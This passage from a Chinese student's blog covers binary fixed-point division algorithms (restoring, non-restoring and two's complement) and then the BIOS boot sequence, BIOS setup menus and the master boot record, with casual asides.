<p>这个规则第一条我就绷不住了,就算是两个定点纯小数,被除数的绝对值也不一定比除数小吧,比如$0.1111\div 0.0111$,整数也是如此</p>
<p>那为啥要这样规定呢?为了保证两个定点纯小数的除法结果还是一个定点纯小数,</p>
<p>一旦被除数的绝对值大,则至少结果的整数部分可以商出一个1来,这时候运算结果就是定点既有整数也有小数了</p>
<p>而我们希望的是不使用整数部分,硬件上根本就不允许整数部分有意义,而是只保留小数部分</p>
<p>比如$0.1111\div 0.0111&#x3D;1.00010001..$</p>
<p>而硬件是这样计算的:$1111\div 0111&#x3D;00010001$,因为硬件就认为这个结果只可能是小数</p>
<p>下面通过列竖式的方法计算$X&#x3D;0.1011$,$Y&#x3D;0.1101$两数的除法,推导适用于机器的算法</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617090654188.png" alt="image-20220617090654188"></p>
<p>由于已经保证被除数绝对值小,因此结果的整数个位必定商0</p>
<p>人类在计算竖式的过程中有一个特点—人类会<strong>试商</strong>,啥意思呢?</p>
<p>在商了前两个1之后,下面要计算$1010\div 1101$,</p>
<p>人类一看除数大,商1就过分了,剪出来一个负数,因此人类此时会商0.</p>
<blockquote>
<p>试商我们从小学就学过了,那时候是在十进制下,每次试商都要按照9,8,7,…,2,1,0这种顺序试商(熟练了可以用二分结果试商),直到试到某个值n,此时用n去乘被除数得到的积刚好比中间结果小或者相等整除,并且商$n+1$刚好比中间结果大,那么n就是该位应该上的商</p>
<p>而现在对于二进制,每一位只有两种状态0或者1,我们只需要试商1,成功则商1,失败则商0</p>
<p>本质思想是相同的,只不过二进制中商0和商1是相互对立事件,而十进制中商0和商1是互不相容事件,因为十进制下还可以商2,3,等等</p>
</blockquote>
<p>然而机器怎么试商呢?机器进行的每步运算都要改变硬件状态,试商会直接把商写进中间过程位向量,他只有一次机会,不允许试.而人类可以在草稿上试商然后将准确的商写道卷子上</p>
<h3 id="恢复余数法"><a href="#恢复余数法" class="headerlink" title="恢复余数法"></a>恢复余数法</h3><p>虽然机器不能试商,但是机器可以知道的是,自己尚一个1,有没有商的太过分了,</p>
<p>商1,则用中间结果去减被除数,如果减出来结果是个负数,机器就能根据符号位知道发生了什么.</p>
<p>他知道刚才商的太狠了,本应该下手轻点的.</p>
<p>于是他可以反悔,刚才商1导致中间结果负了,那么现在改商0,中间结果再加一个被除数还原到商1之前的情况,刚才商的1不算数.这个过程叫做”<strong>恢复余数</strong>“</p>
<p>手算模拟$X&#x3D;-0.10001011除以Y&#x3D;0.0110$的过程</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617093100955.png" alt="image-20220617093100955"></p>
<p>最终结果咋看呢?</p>
<p>看最后一行,</p>
<p>商的绝对值是$0.1001$,最前面这个0肯定是0,这就是整数位个位的商,由于被除数比除数小,因此这一位必定为0,商的结果根据除数和被除数的符号位异或决定,因此商是$1.1001$</p>
<p>余数的绝对值是$0.1101\times 2^{-4}$,符号应该和商一致,因此余数是$1.1101\times 2^{-4}$</p>
<p>这里$2^{-4}$怎么来的呢?余数实际上是中间过程位向量最开始时的低四位经过运算和左移得到的,其本来的权就是$2^{-4}$</p>
<p>为啥乘法的时候需要中间过程右移,而除法的时候需要中间过程左移呢?</p>
<p>在做除法的时候我们都是从高位往低位商,而做乘法的时候是从低位向高位乘,两种运算的顺序相反</p>
<p>做除法时早商应该比晚商权重高,通过左移,越早的商越高,权重越大</p>
<p>从图上可以发现一个问题,够减的时候,中间结果左移,不够减的时候,恢复余数,不左移</p>
<p>怎么让机器知道够不够减?前面分析的是根据符号位.</p>
<p>确实根据符号位可以知道这个事情,但是知道了怎么处理呢?</p>
<p>哪个元件可以根据CF的状态,决定给ALU送什么数呢?这个过程对硬件来说太抽象,不容易实现</p>
<p>想法总是千奇百怪,但是真到落地实现的时候,直接摔死</p>
<blockquote>
<p>这让我想到大二上学微信小程序的时候,我竟然痴心妄想整一个支持markdown,用缩进表示分支的思维导图(Flowchart).属实是高估自己的编程能力和知识储备了</p>
<p>然而本学期tx学写游戏的时候,一些听上去天马行空的事情,都被库函数实现了,只能说,人定胜天</p>
</blockquote>
<h3 id="加减交替法"><a href="#加减交替法" class="headerlink" title="加减交替法"></a>加减交替法</h3><p>由于恢复余数法不方便实现,考虑一个让硬件舒服的方法</p>
<p>还是从恢复余数法中吸取教训</p>
<p>不妨定义一个说法”回合”,感觉这像是一个状态机</p>
<p>每一回合都要经过,恢复余数(这算是上回合留下的屁股),左移一位,上本次的商,这几个过程</p>
<p>如果上回合留下了一个屁股,即上回合商1导致中间过程负了,本回合需要首先加上被除数恢复余数,并且上回合的商1作废,改为0,然后左移一位,让上回合的商升权2,然后直接商1,把屁股留给下一个回合</p>
<p>如果上回合没有留下屁股,即上回合商1,中间过程减去被除数得到正数,则不需要恢复余数,直接左移让上回合的商1升权2,然后直接商1把本回合的屁股留给下一个回合</p>
<p>好的, 现在考虑,</p>
<p>本回合需要处理上回合的屁股,首先R(中间过程结果)+Y(被除数),</p>
<p>然后左移一位,$2(R+Y)$</p>
<p>然后处理本回合事物,直接商1有$2(R+Y)-Y&#x3D;2R+Y$</p>
<p>这不就相当于刚才不擦屁股,直接余数R左移,然后加上Y吗</p>
<p>本回合不用擦上回合的屁股</p>
<p>直接R左移一位变成2R</p>
<p>然后处理本回合事物,直接商1有$2R-Y$</p>
<p>综上,每个回合要么$2R+Y$,要么$2R-Y$,总共两种状态,</p>
<p>通过中间过程符号位决定本回合采用哪种状态</p>
<p>啥时候上商呢?在回合开始还没有位移的时候,根据中间过程的符号上商,</p>
<p>中间过程符号为0则商1,中间过程符号为1则商0</p>
<p>这就好实现了,</p>
<p>2R相当于本回合上来就中间过程左移,</p>
<p>中间过程符号位作为地址端接到2选1选择器,</p>
<p>符号为1则$-Y$选通,并且还要向ALU最低位加一个1,实现加补操作</p>
<p>符号为0则$+Y$选通</p>
<p>硬件实现如图</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617102424109.png" alt="image-20220617102424109"></p>
<p>怎么解读这个框图呢?</p>
<p>以$X&#x3D;-0.10001011,Y&#x3D;0.1110$为例,</p>
<p>$|X|&#x3D;0.10001011,|Y|&#x3D;0.1110$</p>
<p>一开始$|X|$放在D和A中</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617103310655.png" alt="image-20220617103310655"></p>
<p>第一回合,本回合比较特殊,当前中间过程就是被除数(绝对值),符号为正,但是商0</p>
<p>然后左移,刚才的符号位0取反后移入$A_0$,$A_0&#x3D;1$决定本回合-Y,即加Y补</p>
<p>得到新的中间过程</p>
<p>如下图描述</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617104129464.png" alt="image-20220617104129464"></p>
<p>第二回合,当前中间过程为$00’00110110’$,符号为正,商1</p>
<p>左移一位,符号位0取反之后移入$A_0$,$A_0&#x3D;1$决定本回合$-|Y|$,即加补</p>
<p>得到新的中间过程</p>
<p>如下图描述</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617104639433.png" alt="image-20220617104639433"></p>
<p>第三回合,当前中间过程为$11’10001101$,符号为负,商1</p>
<p>左移一位,符号位1取反得0之后移入$A_0$,$A_0&#x3D;0$决定本回合应该$+|Y|$</p>
<p>得到新的中间过程</p>
<p>如下图描述</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617104826502.png" alt="image-20220617104826502"></p>
<p>以此类推</p>
<p>最终结果怎么看呢?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617105339564.png" alt="image-20220617105339564"></p>
<p>商这一列从上到下就是商,最上面这个0不用管,每次都是0,原因是我们故意控制被除数绝对值比除数小</p>
<p>或者看最下面这一行最右边01001,就是商这一列不断右移得到的</p>
<p>余数绝对值$0.1101\times 2^{-4}$,符号和商相同,都要看被除数和除数的符号异或</p>
<h2 id="补码除法"><a href="#补码除法" class="headerlink" title="补码除法"></a>补码除法</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617110237294.png" alt="image-20220617110237294"></p>
<p>这句话我看了好半天才看明白,</p>
<p>“与乘法运算的情况类似,有时也会<strong>迂回</strong>到补码乘法”</p>
<p>好家伙算个数还有迂回战术,就gx那三眼一板,一丝不苟的治学态度,我不大相信他能整出这样的词儿来</p>
<p>看了好几遍发现没有”回”,就一个”迂”,</p>
<p>是在说用补码做除法的人都<strong>迂</strong>吗?想到这里我都笑出了声,</p>
<p>用迂字骂人真有感觉,尤其和13合起来,”迂13!”,这山东话绝对有气势</p>
<blockquote>
<p>巧了宿舍群就这样命名的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617110800214.png" alt="image-20220617110800214"></p>
</blockquote>
<p>应该是错字,本来想用”用”字的</p>
<p>绷不住了</p>
<h3 id="补码除法状态机"><a href="#补码除法状态机" class="headerlink" title="补码除法状态机"></a>补码除法状态机</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617111542233.png" alt="image-20220617111542233"></p>
<p><strong>状态</strong>就是被除数或者说余数,或者说中间过程位向量的符号状态,所有的状态转移都是根据该符号位决定的</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/15/%E8%B5%B7%E6%9D%A5,%E4%B8%8D%E6%84%BF%E5%81%9A%E6%9D%BF%E7%A0%96%E5%84%BF%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/15/%E8%B5%B7%E6%9D%A5,%E4%B8%8D%E6%84%BF%E5%81%9A%E6%9D%BF%E7%A0%96%E5%84%BF%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA/" class="post-title-link" itemprop="url">起来,不愿作板儿砖的计算机</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-15 00:34:00" itemprop="dateCreated datePublished" datetime="2022-06-15T00:34:00+08:00">2022-06-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-16 00:51:42" itemprop="dateModified" datetime="2022-06-16T00:51:42+08:00">2022-06-16</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="起来-不愿作板儿砖的计算机"><a href="#起来-不愿作板儿砖的计算机" class="headerlink" title="起来,不愿作板儿砖的计算机"></a>起来,不愿作板儿砖的计算机</h1><p>“pull oneself up by one’s bootstraps”拉着自己的鞋带站起来</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/439512-b9c6066addb32acd.png"></p>
<h2 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h2><h3 id="BIOS做的事情"><a href="#BIOS做的事情" class="headerlink" title="BIOS做的事情"></a>BIOS做的事情</h3><blockquote>
<ol>
<li>Power is turned on.</li>
<li>The CPU hands control over to the BIOS.</li>
<li>The BIOS runs a program called Power-On Self Test, which determines how much memory the computer has and then confirms that critical low-level hardware is operating correctly. Any errors are indicated by sequences of audible beeps. After this, the BIOS disables all configurable devices.</li>
<li>The BIOS identifies all of the computer’s peripheral devices, such as hard drives and expansion cards. It first looks for plug-and-play devices and assigns a number to each, but it doesn’t enable the devices at this time.</li>
<li>The BIOS locates the primary boot or initial program load (IPL) device. This is usually a storage device such as a hard drive, floppy drive or CD-ROM that holds the operating system, but it can be a network card connected to a server. The BIOS also locates all of the system’s secondary IPL devices.</li>
<li>The BIOS builds a system resource table, assigning conflict-free resources according to which devices it found and the configuration data stored in nonvolatile RAM.</li>
<li>It selects and enables the primary input (keyboard) and output (monitor) devices, so that if trouble occurs during the boot process, the BIOS can display a recovery screen and allow the user to select a stored configuration of system settings that are known to work. The BIOS captured these settings the last time the computer booted successfully, and it stores them in nonvolatile RAM.</li>
<li>It scans for non-plug-and-play devices, including the Peripheral Component Interconnect (PCI) bus, and adds data from their ROMs to its resource table.</li>
<li>The BIOS resolves device conflicts and configures the chosen boot device.</li>
<li>It enables plug-and-play devices by calling their option ROMs with appropriate parameters.</li>
<li>It starts the bootstrap loader. If, for some reason, the default IPL fails to load the operating system, the BIOS tries the next IPL device in the list.</li>
<li>The IPL device loads the operating system into memory.</li>
<li>The BIOS hands over control to the operating system, which may make other resource assignments.</li>
</ol>
</blockquote>
<p>1.上电</p>
<p>2.CPU将控制交给BIOS</p>
<p>3.BIOS开始上电自检,用来检查计算机内存大小,检查底层硬件是否正常运作.</p>
<p>只要有错就用蜂鸣器发出相应的叫声.</p>
<p>此后,BIOS禁用所有可配置设备(刚才检查的时候算是暂时启用了一下)</p>
<blockquote>
<p>我装在commando上的kali物理机每次开机都会用最大声音”Bee”一下,不太聪明的亚子</p>
</blockquote>
<p>4.BIOS识别计算机的所有外设,比如硬件驱动器和拓展卡(比如独立网卡独立显卡).</p>
<p>BIOS首先搜索所有即插即用式设备并为每个设备<strong>编号</strong>,但是此时并不将这些设备使能</p>
<p>5.BIOS定位主引导程序或者初始化加载程序设备.这种设备通常是一个存储设备比如硬盘,软盘,或者光驱,该设备上应当编程有操作系统,该设备甚至还可以是连接到一台服务器的网卡(这个有点离谱了)</p>
<p>6.BIOS 建立一张系统资源表，根据它找到的设备和存储在非易失性 RAM 中的配置数据分配无冲突资源。</p>
<p>7.BIOS使能基本输入(键盘)和输出(显示器)设备,如此当此后的启动过程中万一发生错误,BIOS可以打印打印恢复选项屏幕,并且让用户选择一个系统设定,然后BIOS遵旨继续执行.</p>
<p>BIOS会保存最后一次计算机成功启动时的设定,用那一次的设定进行恢复,这些设置被保存在非易失性RAM中</p>
<p>8.BIOS扫描所有<strong>非</strong>即插即用式设备,包括外设总线,并将这些设备的ROM中的数据添加到刚才建立的资源表中</p>
<p>9.BIOS解决设备冲突,确定boot所在的设备</p>
<p>10.BIOS通过使用适当参数,调用即插即用式设备的选项ROM,使能这些设备</p>
<p>11.BIOS启动bootstrap loader.</p>
<p>如果默认的IPL(InitialProgramLoader)(第9步设置的设备)不能装载操作系统,则BIOS尝试列表中的下一个IPL设备</p>
<p>12.IPL设备将操作系统装载进入内存</p>
<p>13.控制权交给操作系统,操作系统将进行其他资源分配</p>
<p>到此计算机启动完毕,BIOS完成使命</p>
<h3 id="BIOS设置"><a href="#BIOS设置" class="headerlink" title="BIOS设置"></a>BIOS设置</h3><h4 id="Main视图"><a href="#Main视图" class="headerlink" title="Main视图"></a>Main视图</h4><p>在我的ubuntu10.04 虚拟机上,开机的时候根据提示按下F2就可以进入BIOS选择阶段</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613140700106.png" alt="image-20220613140700106"></p>
<p>可见BIOS这么小的系统也已经图形化了</p>
<p>在Main视图下,可以修改系统日期时间</p>
<h5 id="Legacy-Diskette"><a href="#Legacy-Diskette" class="headerlink" title="Legacy Diskette"></a>Legacy Diskette</h5><p>设置软驱,都2202年了,不会有人还在用软驱吧,不管他了</p>
<h5 id="Primary-Second-Master-Slave"><a href="#Primary-Second-Master-Slave" class="headerlink" title="Primary&#x2F;Second Master&#x2F;Slave"></a>Primary&#x2F;Second Master&#x2F;Slave</h5><p>Primary Master&#x2F;Slave不是”主要大师&#x2F;奴隶”,是设置主IDE的主从通道</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613141246521.png" alt="image-20220613141246521"></p>
<p>IDE是啥?Integrated Drive Electronics,”把控制器和盘体集成的硬盘驱动器”</p>
<p>我不想下到硬件看看接口是什么样的了,就认为IDE是接硬盘的</p>
<p>如果IDE硬盘接到IDE通道的主通道(Primary)则BIOS将其作为引导盘</p>
<h5 id="Keyboard-Features"><a href="#Keyboard-Features" class="headerlink" title="Keyboard Features"></a>Keyboard Features</h5><p>“键盘特性”</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613142143514.png" alt="image-20220613142143514"></p>
<p>NumLock</p>
<p>里面有一个NumLock,数字锁,也就是键盘上最右边的数字小键盘锁,Off则开机自动关闭,不让用数字键,On则开机自动开启.即使这里是Off,也可以在开机时自己按键盘上的NumLock改变状态</p>
<p>Keyboard auto-repeat delay: [1&#x2F;2 sec]</p>
<p>考虑这么一长串字符你会怎么输入<code>aaaaaaaaaaaaaaaaaaa</code>,是不是按住a一直不放.</p>
<p>有没有注意过,但是按一下a,只会输出一个a,即使手稍微慢一点,也是只会输出一个a,并没有趁机写好几个a,从单输入第一个a到计算机认为需要连续获取输入之间的时间就是这个设置,</p>
<p>这里设为1&#x2F;2秒,即按下a之后不松开,过半秒之后就获取一长串输入</p>
<p>Keyboard auto-repeat rate: [30&#x2F;sec]</p>
<p>这个是啥呢?在键盘开始一长串输入后,每秒内输入几个a呢?100个?10个?1000个?</p>
<p>如果是1000,那么一旦Keyboard auto-repeat delay开关被打开,则眨眼间写入了百八十个a,写太多了,又要长按Backspace退格删除,Keyboard auto-repeat delay开关又被打开,呼哧一下删了百八十个a,甚至之前写的东西也退掉了.</p>
<p>显然1000这个数灵敏度太高,在我的windows上大约是20个左右,确切是多少我也不知道,重新开机看看吗,那个时候又没法截图</p>
<p>在这个ubuntu虚拟机上可以看见是30个</p>
<p>这里三个设置是根据用户习惯设置的,为人性化设置的</p>
<h5 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h5><p>然后展示了两个内存</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613143304212.png" alt="image-20220613143304212"></p>
<p>就让看看,根本不让改</p>
<p>两个内存分别是啥呢?</p>
<p>去中文站点儿查,就给说”System Memory是系统内存”,这傻子都会翻译还tm用你说,什么系统的内存啊?</p>
<h5 id="Boot-time-Diagnositc-Screen"><a href="#Boot-time-Diagnositc-Screen" class="headerlink" title="Boot-time Diagnositc Screen"></a>Boot-time Diagnositc Screen</h5><p>启动时诊断屏幕,这是个啥呢?</p>
<p>给他改成Enable然后重启看看,开机的时候会有一两秒的这个页面</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613151050418.png" alt="image-20220613151050418"></p>
<p>没有错误的就”Passed”或者”initialized”</p>
<h4 id="Advanced视图"><a href="#Advanced视图" class="headerlink" title="Advanced视图"></a>Advanced视图</h4><p>“高级”</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613151239709.png" alt="image-20220613151239709"></p>
<h5 id="Multiprocessor-Specification"><a href="#Multiprocessor-Specification" class="headerlink" title="Multiprocessor Specification"></a>Multiprocessor Specification</h5><p>“多处理器规范”</p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/MultiProcessor_Specification">MultiProcessor Specification - Wikipedia</a></p>
<p><a target="_blank" rel="noopener" href="https://pdos.csail.mit.edu/6.828/2008/readings/ia32/MPspec.pdf">MultiProcessor Specification (mit.edu)</a></p>
<blockquote>
<p>The <strong>MultiProcessor Specification</strong> (<strong>MPS</strong>) for the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/X86_architecture">x86 architecture</a> is an <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Open_standard">open standard</a> describing enhancements to both <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Operating_system">operating systems</a> and <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Firmware">firmware</a>, which will allow them to work with x86-compatible processors in a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Multiprocessing">multi-processor</a> configuration. MPS covers <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Advanced_Programmable_Interrupt_Controller">Advanced Programmable Interrupt Controller</a> (APIC) architectures.</p>
<p>Version 1.1 of the specification was released on April 11, 1994. Version 1.4 of the specification was released on July 1, 1995, which added extended configuration tables to improve support for multiple PCI bus configurations and improve expandability.</p>
<p>The <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Linux_kernel">Linux kernel</a> and <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/FreeBSD">FreeBSD</a> are known to support the Intel MPS. <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows_NT">Windows NT</a> are known to support MPS 1.1 and <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows_2000">Windows 2000</a> or higher are known to support MPS 1.4. <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/OS/2">OS&#x2F;2</a> are known to support MPS 1.1 only. <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Mac_OS_X">Mac OS X</a> are known to support MPS 1.4 only.</p>
</blockquote>
<p>针对 x86架构的 MultiProcessor 规范(MPS)是一个开放标准，描述了对操作系统和固件的增强，这将允许它们在多处理器配置中与 x86兼容的处理器一起工作。</p>
<p>1.1版本于1994年4月11日发布。1.4版本于1995年7月1日发布，它添加了扩展配置表，以改进对多个 PCI 总线配置的支持，并提高可扩展性。</p>
<p>Linux内核和FreeBSD都是支持英特尔MPS的,</p>
<p>WindowsNT支持1.1版本</p>
<p>Windows2000以及更高版本系统支持1.4版本</p>
<p>多处理器规定,推测和解决多处理器对总线的竞争等等事务有关,还需要进一步阅读intel官方文件</p>
<h5 id="Installed-O-S"><a href="#Installed-O-S" class="headerlink" title="Installed O&#x2F;S"></a>Installed O&#x2F;S</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613153315480.png" alt="image-20220613153315480"></p>
<p>计算机启动到此时,并没有装载操作系统,如果有多系统的话,是时候做出选择了</p>
<h5 id="Reset-Configuration-Data"><a href="#Reset-Configuration-Data" class="headerlink" title="Reset Configuration Data:"></a>Reset Configuration Data:</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613153439605.png" alt="image-20220613153439605"></p>
<p>重设,在BIOS上做出的修改全都改回去?</p>
<p>如果真的是这个功能,那么Exit是干啥用的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613210834456.png" alt="image-20220613210834456"></p>
<h5 id="Cache-Memory"><a href="#Cache-Memory" class="headerlink" title="Cache Memory"></a>Cache Memory</h5><p>内存的高速缓存</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613153550753.png" alt="image-20220613153550753"></p>
<p>第一个选项是选择启动还是关闭内存到CPU之间的高速缓存</p>
<p>第二个选项是系统总线的高速缓存,</p>
<p>…</p>
<h5 id="I-O-Device-Configuration"><a href="#I-O-Device-Configuration" class="headerlink" title="I&#x2F;O Device Configuration"></a>I&#x2F;O Device Configuration</h5><p>“输入输出设备配置”</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613204029245.png" alt="image-20220613204029245"></p>
<p>Serial port:串行通信接口,通过该接口,信息只能按顺序,一个一个比特传输</p>
<p>比如</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Serial_port_(9-pin).jpg/170px-Serial_port_(9-pin).jpg" alt="DE-9 公口"></p>
<p>Parallel port:并行通信接口,一次性并行传送多个比特</p>
<p>比如</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Parallel_computer_printer_port.jpg/150px-Parallel_computer_printer_port.jpg" alt="DB-25 母口"></p>
<p>Floppy disk controller,软盘控制器</p>
<p>I&#x2F;O Device Configuration就是修改这些接口是否使能,信息传送方向等</p>
<h5 id="Large-Disk-Access-Mode"><a href="#Large-Disk-Access-Mode" class="headerlink" title="Large Disk Access Mode"></a>Large Disk Access Mode</h5><p>大硬盘访问模式</p>
<blockquote>
<p>关于硬盘模式</p>
<p>参考<a target="_blank" rel="noopener" href="https://www.muzijie.com/a1/43w5o5m3.html">BIOS设置硬盘工作模式 - 木子杰软件教程 (muzijie.com)</a></p>
<p>NORMAL普通模式是最早的IDE方式。在此方式下对硬盘访问时,BIOS和IDE控制器对参数不作任何转换。</p>
<p>该模式支持的最大柱面数为1024,最大磁头数为16,最大扇区数为63,每扇区字节数为 512。因此支持最大硬盘容量为：$512×63×16×1024&#x3D;528MB$。</p>
<p>在此模式下即使硬盘的实际物理容量更大,但可访问的硬盘空间也只能是528MB。</p>
<p>LBA(Logical Block Addressing)逻辑块寻址模式。</p>
<p>这种模式所管理的硬盘空间突破了528KB 的瓶颈,可达8.4GB。</p>
<p>在LBA模式下,设置的柱面、磁头、扇区等参数并不是实际硬盘的物理参数。</p>
<p>在访问硬盘时,由IDE控制器把由柱面、磁头、扇区等参数确定的逻辑地址转换为实际硬盘的物理地址。</p>
<p>在LBA模式下,可设置的最大磁头数为255,其余参数与普通模式相同。</p>
<p>由此可计算出可访问的硬盘容量为:$512×63×255×1024&#x3D;8.4GB$。</p>
<p>LARGE大硬盘模式。当硬盘的柱面超过1024而又不为LBA支持时可采用此种模式。</p>
<p>LARGE模式采取的方法是把柱面数除以2,把磁头数乘以2,其结果总容量不变。</p>
<p>例如,在NORMAL模式下柱面数为1220,磁头数为16,进入LARGE模式则柱面数为610,磁头数为32。</p>
<p>这样在DOS看来柱面数小于1024,即可正常工作。目前基本上只有LBA有实际意义了。</p>
</blockquote>
<h5 id="Local-Bus-IDE-adapter"><a href="#Local-Bus-IDE-adapter" class="headerlink" title="Local Bus IDE adapter"></a>Local Bus IDE adapter</h5><p>局部总线IDE适配器</p>
<blockquote>
<p>随着CPU的飞速发展, 总线的低传输速率与微处理器的高处理速度不能同步, </p>
<p>造成硬盘、图形卡和其它高速外设只能通过一个狭窄而缓慢的瓶颈发送和接收数据,</p>
<p>从而严重影响了CPU高性能的充分发挥, 工业界因此又发展了局域总线(Local Bus)的新技术.</p>
<p>局域总线是在CPU总线与ISA或EISA总线之间新增加的一级总线. </p>
<p>它独立于CPU的结构, 与CPU的时钟频率无关, 使总线形成了一种独特的中间缓冲器. </p>
<p>一些高速外设, 如网卡和硬盘适配器等, 可以从ISA总线上卸下, </p>
<p><strong>通过局域总线直接挂接到CPU总线上, 从而解决了低速总线在高速微处理器和高速外设之间形成的瓶颈.</strong></p>
<p>什么是总线、总线的类型、局部总线、局部总线类型和什么是接口方式？什么是IDE？什么是SCSI？</p>
</blockquote>
<h5 id="Advanced-Chipset-Control"><a href="#Advanced-Chipset-Control" class="headerlink" title="Advanced Chipset Control"></a>Advanced Chipset Control</h5><p>“高级芯片控制”</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613210006072.png" alt="image-20220613210006072"></p>
<p>我是真的一点儿看不懂了</p>
<h4 id="Security视图"><a href="#Security视图" class="headerlink" title="Security视图"></a>Security视图</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613210213455.png" alt="image-20220613210213455"></p>
<p>设置密码用的</p>
<h4 id="Boot"><a href="#Boot" class="headerlink" title="Boot"></a>Boot</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613210249009.png" alt="image-20220613210249009"></p>
<p>用+或者-调整设备顺序</p>
<p>这里就是”9.BIOS解决设备冲突,确定boot所在的设备”需要设置的</p>
<p>如果使用U盘作为安装盘,则BOOT中USB串行通用接口设置到最前</p>
<p>在物理机上如果U盘设置到磁盘的后面,BIOS会从磁盘启动,如果磁盘中之前有装好的操作系统,则BIOS将会唤醒那个操作系统</p>
<p>如果磁盘中没有操作系统则BIOS重新尝试从U盘启动</p>
<h2 id="主引导记录MBR"><a href="#主引导记录MBR" class="headerlink" title="主引导记录MBR"></a>主引导记录MBR</h2><p>在BIOS boot视图下,我们设置了启动顺序</p>
<p>现在,BIOS按照该顺序给控制权</p>
<p>控制交给第一个存储设备,CPU读取该设备最前面512字节</p>
<p>如果该设备的最后两个字节为<code>0x55 AA</code>则表明这个设备可以用于启动操作系统.</p>
<p>否则这个设备白搭,控制交给下一个设备</p>
<h3 id="磁盘上的主引导记录"><a href="#磁盘上的主引导记录" class="headerlink" title="磁盘上的主引导记录"></a>磁盘上的主引导记录</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613110740974.png" alt="MOS-磁盘文件系统布局"></p>
<p>整个磁盘只有一个MBR(master boot record)主引导记录,一个分区表(分区表是MBR的一部分)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613114613846.png" alt="MBR结构">最开始的218个字节就是<code>Bootstrap code area</code></p>
<p>后面有多个磁盘分区,每个分区在分区表中都有一条记录,记录该分区的开始与结束</p>
<p>这里”分区”在我们小打小闹儿的笔记本子上就是指卷(简单卷)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613113439425.png" alt="image-20220613113439425"></p>
<p>比如我的电脑512G的固态硬盘被分成三个卷</p>
<p>MOS上关于这部分的描述十分滴珍贵,写的是汉字但是就是不说人话</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613113524034.png" alt="image-20220613113524034"></p>
<p>从”表中的一个分区被标记为活动分区”这句开始,我就不知道它在说什么了</p>
<p><strong>活动分区</strong>是什么,不给说,查了百科才知道</p>
<blockquote>
